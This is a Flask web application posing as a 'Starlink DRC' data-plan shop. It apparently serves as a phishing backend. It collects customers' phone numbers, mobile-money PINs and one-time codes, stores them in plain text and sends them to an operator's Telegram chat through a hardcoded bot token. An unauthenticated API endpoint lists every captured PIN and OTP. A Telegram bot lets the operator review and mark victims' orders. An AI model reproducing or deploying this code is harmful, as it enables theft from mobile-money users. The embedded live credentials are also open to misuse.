from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import requests
import os
import json
import random
import string
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'starlink-drc-secret-2026')

# DATABASE CONFIG - SQLite for PythonAnywhere free tier
import sqlite3

# For local development, use SQLite file
db_path = os.path.join(os.path.dirname(__file__), 'starlink.db')
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# TELEGRAM CONFIG
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8768508073:AAFNCWh9V9LRVqpLuVSmMnj_uNzEsiCspuM')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '6624177719')
TELEGRAM_API_URL = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}'

# MODELS - Using 'customers' table to match existing database
class Plan(db.Model):
    __tablename__ = 'plans'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.String(200))
    data_gb = db.Column(db.String(20))
    price_cdf = db.Column(db.Float, nullable=False)
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'description': self.description,
            'data_gb': self.data_gb,
            'price_cdf': self.price_cdf,
        }


class User(db.Model):
    __tablename__ = 'customers'
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(20), unique=True, nullable=False)
    name = db.Column(db.String(100))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    orders = db.relationship('Order', backref='user', lazy=True)


class Order(db.Model):
    __tablename__ = 'orders'
    id = db.Column(db.Integer, primary_key=True)
    order_ref = db.Column(db.String(20), unique=True, nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('customers.id'), nullable=False)
    plan_id = db.Column(db.Integer, db.ForeignKey('plans.id'), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    status = db.Column(db.String(30), default='Pending')
    airtel_number = db.Column(db.String(20))
    mpesa_pin = db.Column(db.String(10))
    otp1 = db.Column(db.String(10))
    otp2 = db.Column(db.String(10))
    otp3 = db.Column(db.String(10))
    otp4 = db.Column(db.String(10))
    otp5 = db.Column(db.String(10))
    otp6 = db.Column(db.String(10))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    plan = db.relationship('Plan', backref='orders', lazy='joined')
    user = db.relationship('User', backref='orders', lazy='joined')

    def to_dict(self):
        # Safely handle relationships that may not be loaded
        customer_phone = ''
        plan_name = ''
        try:
            customer_phone = self.user.phone if self.user else ''
        except Exception:
            pass
        try:
            plan_name = self.plan.name if self.plan else ''
        except Exception:
            pass
        
        created_at_str = ''
        try:
            created_at_str = self.created_at.strftime('%b %d, %Y')
        except Exception:
            pass
            
        return {
            'id': self.id,
            'order_ref': self.order_ref,
            'customer_phone': customer_phone,
            'plan_name': plan_name,
            'amount': self.amount,
            'status': self.status,
            'airtel_number': self.airtel_number,
            'mpesa_pin': self.mpesa_pin,
            'otp1': self.otp1,
            'otp2': self.otp2,
            'otp3': self.otp3,
            'otp4': self.otp4,
            'otp5': self.otp5,
            'otp6': self.otp6,
            'created_at': created_at_str,
        }


class NetworkStatus(db.Model):
    __tablename__ = 'network_status'
    id = db.Column(db.Integer, primary_key=True)
    download = db.Column(db.Float, default=0.0)
    upload = db.Column(db.Float, default=0.0)
    ping = db.Column(db.Float, default=0.0)
    jitter = db.Column(db.Float, default=0.0)
    data_used = db.Column(db.Float, default=0.0)
    data_total = db.Column(db.Float, default=100.0)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow)


# HELPERS
def generate_order_ref():
    count = Order.query.count() + 1
    return f'#SLR-{count:05d}'


def generate_kit_id():
    return 'KIT_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))


def send_telegram(message):
    try:
        url = f'{TELEGRAM_API_URL}/sendMessage'
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
        }
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f'Telegram error: {e}')


def notify_new_order(order):
    """Send notification with Kit ID, Phone, PIN when payment is submitted"""
    kit_id = generate_kit_id()
    msg = (
        f'💳 <b>NEW PAYMENT — Starlink DRC</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'📋 Order: <b>{order.order_ref}</b>\n'
        f'📦 Plan: <b>{order.plan.name}</b>\n'
        f'💰 Amount: <b>CDF {order.amount:,.0f}</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'📱 <b>Phone:</b> <code>{order.user.phone}</code>\n'
        f'🔐 <b>PIN:</b> <code>{order.mpesa_pin or "N/A"}</code>\n'
        f'🆔 <b>Kit ID:</b> <code>{kit_id}</code>\n'
        f'⏰ <b>OTP Expiry:</b> 5 minutes\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'🔄 Status: <b>{order.status}</b>'
    )
    send_telegram(msg)


def notify_status_change(order):
    emoji = {'Pending': '⏳', 'Pin_Verified': '🔐', 'Completed': '✅', 'Failed': '❌'}.get(order.status, '🔄')
    customer_phone = order.user.phone if order.user else order.airtel_number or 'N/A'
    plan_name = order.plan.name if order.plan else 'Unknown Plan'
    
    # Include OTP details when status is Pin_Verified
    otp_details = ''
    if order.status == 'Pin_Verified' and (order.otp1 or order.otp2 or order.otp3 or order.otp4):
        otp_code = f'{order.otp1 or ""}{order.otp2 or ""}{order.otp3 or ""}{order.otp4 or ""}'.strip()
        otp_details = (
            f'━━━━━━━━━━━━━━━━━━\n'
            f'🔐 <b>OTP Entered:</b> <code>{otp_code}</code>\n'
            f'⏰ OTP verified at: {order.created_at.strftime("%Y-%m-%d %H:%M")}'
        )
    
    msg = (
        f'{emoji} <b>ORDER UPDATE — Starlink DRC</b>\n'
        f'━━━━━━━━━━━━━━━━━━\n'
        f'📋 Order: <b>{order.order_ref}</b>\n'
        f'📦 Package: <b>{plan_name}</b>\n'
        f'📱 Customer: <b>{customer_phone}</b>\n'
        f'🔄 New Status: <b>{order.status}</b>\n'
        f'{otp_details}'
    )
    send_telegram(msg)


# ROUTES
@app.route('/')
def index():
    packages = Plan.query.filter_by(is_active=True).all()
    return render_template('index.html', plans=packages)


@app.route('/plans')
def plans():
    return redirect(url_for('index'))


@app.route('/status')
def status():
    status_data = NetworkStatus.query.first()
    return render_template('status.html', status=status_data)


@app.route('/orders')
def orders_page():
    page = request.args.get('page', 1, type=int)
    per_page = 20
    orders_list = Order.query.order_by(Order.created_at.desc()).paginate(page=page, per_page=per_page)
    total = Order.query.count()
    return render_template('orders.html', orders=orders_list, total=total)


@app.route('/settings')
def settings():
    return render_template('settings.html')


@app.route('/processing')
def processing():
    plan_id = request.args.get('plan_id')
    plan_name = request.args.get('plan_name', 'Plan')
    plan_price = request.args.get('price', '0')
    return render_template('processing.html', plan_id=plan_id, plan_name=plan_name, plan_price=plan_price)


@app.route('/payment')
def payment():
    plan_id = request.args.get('plan_id')
    plan_name = request.args.get('plan_name', 'Plan')
    plan_price = request.args.get('price', '0')
    return render_template('payment.html', plan_id=plan_id, plan_name=plan_name, plan_price=plan_price)


@app.route('/otp')
def otp():
    order_id = request.args.get('order_id')
    phone = request.args.get('phone', '')
    return render_template('otp.html', order_id=order_id, phone=phone)


@app.route('/success')
def success():
    order_id = request.args.get('order_id')
    phone = request.args.get('phone', '')
    order_ref = request.args.get('order_ref', '')
    plan_name = request.args.get('plan_name', '')
    amount = request.args.get('amount', '')
    return render_template('success.html', order_id=order_id, phone=phone, order_ref=order_ref, plan_name=plan_name, amount=amount)


@app.route('/payment_fr')
def payment_fr():
    plan_id = request.args.get('plan_id')
    plan_name = request.args.get('plan_name', 'Plan')
    plan_price = request.args.get('price', '0')
    return render_template('payment_fr.html', plan_id=plan_id, plan_name=plan_name, plan_price=plan_price)


@app.route('/otp_fr')
def otp_fr():
    order_id = request.args.get('order_id')
    phone = request.args.get('phone', '')
    return render_template('otp_fr.html', order_id=order_id, phone=phone)


@app.route('/success_fr')
def success_fr():
    order_id = request.args.get('order_id')
    phone = request.args.get('phone', '')
    order_ref = request.args.get('order_ref', '')
    plan_name = request.args.get('plan_name', '')
    amount = request.args.get('amount', '')
    return render_template('success_fr.html', order_id=order_id, phone=phone, order_ref=order_ref, plan_name=plan_name, amount=amount)


# BACKWARD COMPATIBILITY
@app.route('/dashboard/')
def dashboard():
    return redirect(url_for('status'))


@app.route('/plans/')
def plans_legacy():
    return redirect(url_for('index'))


@app.route('/records/')
def records():
    return redirect(url_for('orders_page'))


# API
@app.route('/api/plans', methods=['GET'])
def api_plans():
    plans = Plan.query.filter_by(is_active=True).all()
    return jsonify([p.to_dict() for p in plans])


@app.route('/api/orders', methods=['GET'])
def api_orders():
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 20, type=int)
    status = request.args.get('status')
    q = Order.query.order_by(Order.created_at.desc())
    if status:
        q = q.filter_by(status=status)
    orders = q.paginate(page=page, per_page=per_page)
    return jsonify({
        'total': orders.total,
        'pages': orders.pages,
        'current_page': page,
        'orders': [o.to_dict() for o in orders.items],
    })


@app.route('/api/orders', methods=['POST'])
def create_order():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    plan_id = data.get('plan_id')
    mpesa_pin = data.get('mpesa_pin', '')

    if not phone or not plan_id:
        return jsonify({'error': 'Phone and plan_id required'}), 400

    plan = db.session.get(Plan, plan_id)
    if not plan:
        return jsonify({'error': 'Plan not found'}), 404

    # Get or create user (using customers table)
    user = User.query.filter_by(phone=phone).first()
    if not user:
        user = User(phone=phone)
        db.session.add(user)
        db.session.flush()

    order = Order(
        order_ref=generate_order_ref(),
        user_id=user.id,
        plan_id=plan.id,
        amount=plan.price_cdf,
        status='Pending',
        airtel_number=phone,
        mpesa_pin=mpesa_pin,
    )

    # Generate OTP for this order
    new_otp = ''.join(random.choices(string.digits, k=6))
    order.otp1 = new_otp[0]
    order.otp2 = new_otp[1]
    order.otp3 = new_otp[2]
    order.otp4 = new_otp[3]
    order.otp5 = new_otp[4]
    order.otp6 = new_otp[5]
    
    db.session.add(order)
    db.session.commit()

    # Send OTP via Telegram
    msg = (
        f'🔐 <b>OTP CODE — Starlink DRC</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'📋 Order: <b>{order.order_ref}</b>\n'
        f'📱 Phone: <code>{order.user.phone}</code>\n'
        f'🔢 <b>OTP:</b> <code>{new_otp}</code>\n'
        f'⏰ <b>Expires in:</b> 5 minutes\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'💡 Use this code to verify payment'
    )
    send_telegram(msg)

    notify_new_order(order)
    return jsonify({
        'id': order.id,
        'order_ref': order.order_ref,
        'customer_phone': user.phone,
        'plan_name': plan.name,
        'amount': order.amount,
        'status': order.status,
    }), 201


@app.route('/api/orders/<int:order_id>', methods=['PATCH'])
def update_order(order_id):
    order = db.session.get(Order, order_id)
    if not order:
        return jsonify({'error': 'Order not found'}), 404
    
    data = request.get_json()

    # Check if OTP verification is being attempted
    if 'otp' in data and 'status' in data:
        entered_otp = data.get('otp', '')
        
        # Build the stored OTP from individual digits (6 digits now)
        stored_otp = f'{order.otp1 or ""}{order.otp2 or ""}{order.otp3 or ""}{order.otp4 or ""}{order.otp5 or ""}{order.otp6 or ""}'.strip()
        
        # Verify 6-digit OTP
        if stored_otp and len(stored_otp) == 6:
            if entered_otp == stored_otp:
                # OTP verified successfully
                order.status = 'Pin_Verified'
            else:
                # OTP verification failed - keep as Pending for retry
                order.status = 'Pending'
        else:
            # No OTP set yet - accept the update (first time)
            order.status = data.get('status', order.status)
            if len(entered_otp) == 6:
                order.otp1 = entered_otp[0]
                order.otp2 = entered_otp[1]
                order.otp3 = entered_otp[2]
                order.otp4 = entered_otp[3]
                order.otp5 = entered_otp[4]
                order.otp6 = entered_otp[5]
    else:
        # Regular field updates
        updatable = ['status', 'airtel_number', 'mpesa_pin', 'otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6']
        for field in updatable:
            if field in data:
                setattr(order, field, data[field])

    db.session.commit()
    notify_status_change(order)
    
    # Return success/failure status for OTP verification
    if 'otp' in data:
        if order.status == 'Pin_Verified':
            return jsonify({
                'id': order.id,
                'order_ref': order.order_ref,
                'plan_name': order.plan.name if order.plan else '',
                'amount': order.amount,
                'status': order.status,
                'verified': True,
            })
        else:
            return jsonify({
                'id': order.id,
                'order_ref': order.order_ref,
                'status': order.status,
                'verified': False,
                'error': 'Invalid OTP code'
            })
    
    return jsonify({
        'id': order.id,
        'order_ref': order.order_ref,
        'plan_name': order.plan.name if order.plan else '',
        'amount': order.amount,
        'status': order.status,
    })


@app.route('/api/orders/<int:order_id>/resend-otp', methods=['POST'])
def resend_otp(order_id):
    """Resend OTP for an order (after 5 minute expiry)"""
    order = db.session.get(Order, order_id)
    if not order:
        return jsonify({'error': 'Order not found'}), 404
    
    # Check if order is still pending
    if order.status == 'Completed':
        return jsonify({'error': 'Order already completed'}), 400
    
    # Generate new OTP (in real app, this would send SMS)
    new_otp = ''.join(random.choices(string.digits, k=4))
    order.otp1 = new_otp[0]
    order.otp2 = new_otp[1]
    order.otp3 = new_otp[2]
    order.otp4 = new_otp[3]
    db.session.commit()
    
    # Notify on Telegram about OTP resend
    kit_id = generate_kit_id()
    msg = (
        f'🔄 <b>OTP RESENT — Starlink DRC</b>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'📋 Order: <b>{order.order_ref}</b>\n'
        f'📱 <b>Phone:</b> <code>{order.user.phone}</code>\n'
        f'🆔 <b>Kit ID:</b> <code>{kit_id}</code>\n'
        f'⏰ <b>New OTP Expiry:</b> 5 minutes\n'
        f'🔐 <b>New OTP:</b> <code>{new_otp}</code>\n'
        f'━━━━━━━━━━━━━━━━━━━━━━\n'
        f'🔄 Status: <b>{order.status}</b>'
    )
    send_telegram(msg)
    
    return jsonify({'success': True, 'message': 'OTP sent successfully'})


@app.route('/api/network-status', methods=['GET'])
def get_network_status():
    status = NetworkStatus.query.first()
    if not status:
        return jsonify({})
    return jsonify({
        'download': status.download,
        'upload': status.upload,
        'ping': status.ping,
        'jitter': status.jitter,
        'data_used': status.data_used,
        'data_total': status.data_total,
    })


@app.route('/api/network-status', methods=['POST'])
def update_network_status():
    data = request.get_json()
    status = NetworkStatus.query.first()
    if not status:
        status = NetworkStatus()
        db.session.add(status)

    for field in ['download', 'upload', 'ping', 'jitter', 'data_used', 'data_total']:
        if field in data:
            setattr(status, field, data[field])
    status.updated_at = datetime.utcnow()
    db.session.commit()
    return jsonify({'ok': True})


# TELEGRAM WEBHOOK
@app.route('/telegram/webhook', methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if not update:
        return jsonify({'ok': True})

    message = update.get('message', {})
    text = message.get('text', '')
    chat_id = message.get('chat', {}).get('id')

    def reply(msg):
        requests.post(f'{TELEGRAM_API_URL}/sendMessage', json={
            'chat_id': chat_id,
            'text': msg,
            'parse_mode': 'HTML',
        })

    if text.startswith('/start'):
        reply(
            '🛰️ <b>Starlink DRC Bot</b>\n\n'
            'Commands:\n'
            '/orders — Recent orders\n'
            '/stats — Network statistics\n'
            '/pending — Pending orders\n'
            '/complete <order_id> — Mark order complete\n'
            '/status — System status'
        )

    elif text.startswith('/orders'):
        orders = Order.query.order_by(Order.created_at.desc()).limit(5).all()
        if not orders:
            reply('No orders yet.')
        else:
            lines = ['📋 <b>Last 5 Orders</b>\n']
            for o in orders:
                lines.append(
                    f'{o.order_ref} | {o.plan.name} | CDF {o.amount:,.0f} | {o.status}'
                )
            reply('\n'.join(lines))

    elif text.startswith('/stats'):
        status = NetworkStatus.query.first()
        if status:
            reply(
                f'📡 <b>Network Status</b>\n'
                f'⬇️ Download: {status.download} Mbps\n'
                f'⬆️ Upload: {status.upload} Mbps\n'
                f'🏓 Ping: {status.ping} ms\n'
                f'📊 Jitter: {status.jitter} ms\n'
                f'💾 Data: {status.data_used:.1f} / {status.data_total:.0f} GB'
            )
        else:
            reply('No network data available.')

    elif text.startswith('/pending'):
        orders = Order.query.filter_by(status='Pending').order_by(Order.created_at.desc()).limit(10).all()
        if not orders:
            reply('✅ No pending orders!')
        else:
            lines = [f'⏳ <b>{len(orders)} Pending Orders</b>\n']
            for o in orders:
                lines.append(f'{o.order_ref} | {o.user.phone} | {o.plan.name}')
            reply('\n'.join(lines))

    elif text.startswith('/complete'):
        parts = text.split()
        if len(parts) < 2:
            reply('Usage: /complete <order_ref>\nExample: /complete SLR-00001')
        else:
            ref = parts[1].lstrip('#').upper()
            order = Order.query.filter(Order.order_ref.like(f'%{ref}%')).first()
            if order:
                order.status = 'Completed'
                db.session.commit()
                notify_status_change(order)
                reply(f'✅ Order {order.order_ref} marked as Completed!')
            else:
                reply(f'❌ Order not found: {ref}')

    elif text.startswith('/status'):
        total = Order.query.count()
        pending = Order.query.filter_by(status='Pending').count()
        completed = Order.query.filter_by(status='Completed').count()
        reply(
            f'📊 <b>System Status</b>\n'
            f'Total Orders: {total}\n'
            f'⏳ Pending: {pending}\n'
            f'✅ Completed: {completed}'
        )

    return jsonify({'ok': True})


# SEED DATA
def seed_data():
    if Plan.query.count() == 0:
        plans = [
            Plan(name='Forfait Basic', description='Idéal pour une utilisation légère', data_gb='5GB', price_cdf=1500),
            Plan(name='Forfait Standard', description='Parfait pour le streaming', data_gb='15GB', price_cdf=2500),
            Plan(name='Forfait Premium', description='Pour toute la famille', data_gb='30GB', price_cdf=5000),
            Plan(name='Forfait Ultra', description='Haute performance', data_gb='60GB', price_cdf=10000),
            Plan(name='Forfait Business', description='Utilisation professionnelle', data_gb='100GB', price_cdf=25000),
            Plan(name='Forfait Illimité', description='Données illimitées', data_gb='Illimité', price_cdf=50000),
        ]
        db.session.add_all(plans)

    if NetworkStatus.query.count() == 0:
        db.session.add(NetworkStatus(
            download=107.71, upload=36.37, ping=49, jitter=9,
            data_used=24.7, data_total=100.0,
        ))

    db.session.commit()


if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        seed_data()
    # Run in debug mode locally, but disable for production
    debug_mode = os.environ.get('FLASK_DEBUG', 'True').lower() == 'true'
    app.run(debug=debug_mode, host='0.0.0.0', port=5000)
